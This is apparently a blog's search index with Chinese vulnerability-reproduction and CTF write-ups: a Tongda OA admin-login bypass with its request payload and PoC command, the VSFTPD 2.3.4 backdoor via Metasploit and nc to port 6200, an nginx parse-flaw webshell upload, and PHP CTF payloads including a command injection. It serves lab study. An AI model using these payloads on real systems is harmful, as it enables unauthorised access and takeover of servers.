<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>通达OA前台任意用户登录漏洞复现</title>
      <link href="/2023/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>通达OA是一套使用比较广泛的办公系统。该漏洞因为使用uid作为身份标识，攻击者在远程且未经授权的情况下，通过利用此漏洞，可以直接绕过登录验证逻辑，伪装为系统管理员身份登录OA系统。通达OA官方于2020年4月17日发布安全更新。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>通达OA &lt; 11.5<br>通达OA 2017版本</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>本次复现为2017版本，则重点分析该版本，但原理都是基本相同的，只不过文件路径不同而已。根据POC的代码分析如下，该漏洞涉及的文件包含以下四个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ispirit/login_code.php</span><br><span class="line">/general/login_code_scan.php</span><br><span class="line">/ispirit/login_code_check.php</span><br><span class="line">/general/index.php</span><br></pre></td></tr></table></figure><p>通达OA源码使用zend5加密 ，分析源码需要先进行解密</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110222.png" alt="image-20230916180222601"></p><p>本事使用的解密工具是:SeayDzend，工具使用很简单</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110140.png" alt="image-20230916181002666"></p><h3 id="ispirit-login-code-php："><a href="#ispirit-login-code-php：" class="headerlink" title="&#x2F;ispirit&#x2F;login_code.php："></a><strong>&#x2F;ispirit&#x2F;login_code.php：</strong></h3><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110548.png" alt="image-20230916181726302"></p><p>该文件用来获取codeuid参数，如果不存在，则会自动生成一个codeuid，并且将其写入CODE_LOGIN_PC缓存中（通达OA使用了缓存系统Redis，同时也提供了对缓存的使用方法），但是在18行位置将这个参数显示出来，导致用户可以获取这个参数的值，从而可以绕过后面的验证。</p><h3 id="general-login-code-scan-php："><a href="#general-login-code-scan-php：" class="headerlink" title="&#x2F;general&#x2F;login_code_scan.php："></a><strong>&#x2F;general&#x2F;login_code_scan.php：</strong></h3><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170109895.png" alt="image-20230916182942854"></p><p>在这一文件中，用户可以控制输入的关键参数uid，在存在漏洞的通达OA版本中，后台数据库里uid对应的用户是admin管理员账户。并且将该数据存储在CODE_INFO_PC缓存中，因为我们在第一个文件中获取的codeuid存储在CODE_LOGIN_PC中，所以这里在复现时需要指明source变量为pc，这里的username则为admin，而type变量需要指明为confirm，原因在后面会进行解释。</p><h3 id="ispirit-login-code-check-php："><a href="#ispirit-login-code-check-php：" class="headerlink" title="&#x2F;ispirit&#x2F;login_code_check.php："></a><strong>&#x2F;ispirit&#x2F;login_code_check.php：</strong></h3><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110012.png" alt="image-20230916182413645"></p><p>这里使用之前存储的两个缓存中的内容，一个用来获取codeuid，一个用来获取通过post传入的uid等关键信息，这里红框就是为什么前一步需要将type设置为confirm。</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110249.png" alt="image-20230916182532863"></p><p>这里是最为关键的位置，代码获取用户可控的参数uid，并依次作为依据直接带入数据库进行查询</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110948.png" alt="image-20230916182612401"></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110857.png" alt="image-20230916182757653"></p><p>随后将查询的信息直接写入session中，通过这一步，session中包含的就是管理员的身份信息。</p><p>以上就是该漏洞的原理，V11版本原理类似，可用对照POC中的步骤进行分析复现。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>通达OA-TDOA11.4_2 建议在虚拟机环境下安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe</span><br></pre></td></tr></table></figure><p>下载下来一路默认下一步就行！</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110446.png" alt="image-20230916184345376"></p><p>安装完成最后需要检测端口</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110742.png" alt="image-20230916184810146"></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110101.png" alt="image-20230916184854995"></p><p>最后点击确定就行</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110356.png" alt="image-20230916185126003"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="code1：手工利用"><a href="#code1：手工利用" class="headerlink" title="code1：手工利用"></a>code1：手工利用</h4><p>按照poc中的步骤，首先抓首页的包进行更改，访问&#x2F;ispirit&#x2F;login_code.php</p><p>通过返回包获取codeuid</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110472.png" alt="image-20230916190258275"></p><p>而后使用POST方式访问&#x2F;general&#x2F;login_code_scan.php提交payload，其中codeuid需要改为上一步中返回的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=1&amp;codeuid=&#123;3CD5FFC0-E64E-6E7E-123F-64A3578FF5A0&#125;&amp;type=confirm&amp;source=pc&amp;username=admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110996.png" alt="image-20230916190353017"></p><p>第三步使用GET方式访问&#x2F;ispirit&#x2F;login_code_check.php，带上参数codeuid，让后台进行代入查询，并返回携带管理员身份信息的凭证。</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110753.png" alt="image-20230916190427180"></p><p>经过这步后客户端已经拥有了管理员的身份信息，直接访问OA主页&#x2F;general&#x2F;index.php，放行该数据包，成功以管理员身份登录OA系统。</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110513.png" alt="image-20230916190511191"></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110082.png" alt="image-20230916190536836"></p><h4 id="code2：POC利用"><a href="#code2：POC利用" class="headerlink" title="code2：POC利用"></a>code2：POC利用</h4><p><code>python3 .\POC.py -v 2017 -url http://192.168.142.129/</code></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170111829.png" alt="image-20230916191545447"></p><p>访问主页<code>http://192.168.142.129/general/index.php</code></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170111515.png" alt="image-20230916190714276"></p><p>修改cookie中PHPSESSID的值并刷新页面就会发现登录成功了</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170111828.png" alt="image-20230916191720131"></p><p>最后修改cookie也可以在bp里面修改</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170111144.png" alt="image-20230916191948049"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>更新最新版本</p><h2 id="复现环境所需安装包以及工具"><a href="#复现环境所需安装包以及工具" class="headerlink" title="复现环境所需安装包以及工具"></a>复现环境所需安装包以及工具</h2><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170111921.png" alt="image-20230916192513452"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度链接：https://pan.baidu.com/s/1BYpQZ8lqrHGJu1YohSxqQA?pwd=r8g3 </span><br><span class="line">提取码：r8g3 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VSFTPD 2.3.4 笑脸漏洞</title>
      <link href="/2023/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/VSFTPD%202.3.4%20%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/VSFTPD%202.3.4%20%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>压缩包需要下载特定版本，官方提供的安装包没有这个漏洞</strong></p><p>1.靶机环境是centos7  ，首先解压缩包，并上传到靶机目录</p><p>  tar -zxvf   压缩包名称</p><p>2.进入vsftpd目录，赋予文件权限，之后进行make &amp;&amp;make install</p><p>cd &#x2F;vsftpd-2.3.4</p><p>chmod 777 *</p><p>make &amp;&amp;make install</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="code-1"><a href="#code-1" class="headerlink" title="code:1"></a>code:1</h2><p>使用msf利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/ftp/vsftpd_234_backdoor </span><br><span class="line">set RhoSTS 192.168.142.145</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="code-2"><a href="#code-2" class="headerlink" title="code:2"></a>code:2</h2><p>手动利用</p><p>打开命令行登录ftp服务器，在用户名处输入root:)然后随意输入一个密码回车等待，</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309160952000.png" alt="image-20230916095254559"></p><p>输入nc 目标ip 6200 即可连接</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309160953548.png" alt="image-20230916095306663"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx-0.7.65 解析漏洞</title>
      <link href="/2023/09/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/nginx-0.7.65_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/09/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/nginx-0.7.65_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startup.bat</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213590.png" alt="image-20230907231048142"></p><p>​            2.     访问抓包修改文件后缀</p><p>​可以显示phpinfo</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152216623.png" alt="image-20230915221602546"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152214832.png" alt="image-20230907231341384"></p><h2 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a><strong>Nginx 解析漏洞复现</strong></h2><p>1.开启环境</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213593.png" alt="image-20230907231417121"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213591.png" alt="image-20230907231433052"></p><p>2.抓包修改文件后缀，类型以及内容头</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152217207.png" alt="image-20230907231444059"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213523.png" alt="image-20230907231454645"></p><p>上传成功</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213054.png" alt="image-20230907231514105"></p><p>使用蚁剑连接</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152214790.png" alt="image-20230907231534418"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152218679.png" alt="image-20230915221837364"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>青少年CTF-B2-PHP特性练习01-04</title>
      <link href="/2023/05/12/CTF/%E9%9D%92%E5%B0%91%E5%B9%B4CTF-B2-PHP%E7%89%B9%E6%80%A7%E7%BB%83%E4%B9%A0/"/>
      <url>/2023/05/12/CTF/%E9%9D%92%E5%B0%91%E5%B9%B4CTF-B2-PHP%E7%89%B9%E6%80%A7%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP特性01"><a href="#PHP特性01" class="headerlink" title="PHP特性01"></a>PHP特性01</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[]=admi&amp;password[]=admin</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161032137.png" alt="image">​</p><p>qsnctf{ca5f80d8-085c-4a8d-b474-a74bd1a4aada}</p><h2 id="PHP特性02"><a href="#PHP特性02" class="headerlink" title="PHP特性02"></a>PHP特性02</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value=%<span class="number">0</span>c1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161031690.png" alt="image">​</p><p>qsnctf{c6c71221-f298-41ad-9da8-ca53b4a8b144}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在php中：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">num = %<span class="number">0</span>c36;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>);<span class="comment">//  ---&gt; True</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于比较运算符号：如果两个操作数都是 数字字符串，或者一个操作数是数字而另一个是 数字字符串，则比较以数字方式进行。当比较是&#x3D;&#x3D;&#x3D;或!&#x3D;&#x3D;因为这涉及比较类型和值时，不会发生类型转换 ，因此此时类型和数值都要比对</p><p>所以：**&#x3D;&#x3D;比较的是类型转换之后的数值 而 !&#x3D;&#x3D;不仅要比较数值还要比较类型**</p><p>payload构造的时候只要在1前面写一个空的字符就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?value=%<span class="number">0</span>c1</span><br><span class="line">?value= <span class="number">1</span></span><br><span class="line">?value=%<span class="number">201</span></span><br><span class="line">?value=+<span class="number">01</span></span><br></pre></td></tr></table></figure><h2 id="PHP特性03"><a href="#PHP特性03" class="headerlink" title="PHP特性03"></a>PHP特性03</h2><p>双写绕过</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value=庆历四年春，滕滕子京子京谪守巴巴陵郡陵郡。越明年，政通人和，百废俱兴，乃重修岳岳阳楼阳楼，增其旧制，刻唐贤今人诗赋于其上，属予作文以记之。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161031433.png" alt="image">​</p><p>qsnctf(de64416c-6ff2-4f24-b9c8-7e32f84dda30)</p><h2 id="PHP特性04"><a href="#PHP特性04" class="headerlink" title="PHP特性04"></a>PHP特性04</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?command=<span class="title function_ invoke__">System</span>(<span class="string">&quot;cat f*&quot;</span>);&amp;key=cXNuY3Rm</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161031970.png" alt="image">​</p><p><code>qsnctf&#123;803a0ef5-86e7-4d94-8f1d-3cb8332ee793&#125;</code>​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qsnctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客自述</title>
      <link href="/2022/12/27/hello-world/"/>
      <url>/2022/12/27/hello-world/</url>
      
        <content type="html"><![CDATA[<p>由于博主很穷，兜比脸干净，所以主打的就是一个白嫖</p><p>博客是用GitHub+hexo搭建，图传用的是PicGo+Github+Gitee</p><p>hexo主题用的是安知鱼</p><p>hexo地址：<a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></p><p>安知鱼下载地址：<a href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu">anzhiyu-c&#x2F;hexo-theme-anzhiyu: 这是一个简洁美丽的hexo主题。 (github.com)</a></p><p>安知鱼使用文档：<a href="https://docs.anheyu.com/">安知鱼主题官方文档 | 一个简洁、美丽的静态hexo主题 (anheyu.com)</a></p><p><strong>由于各种白嫖，所以访问速度很慢，图片经常出现加载不出来的情况，各位大佬见谅，如遇到图片没有加载请多刷新几次页面！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 博客自述 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
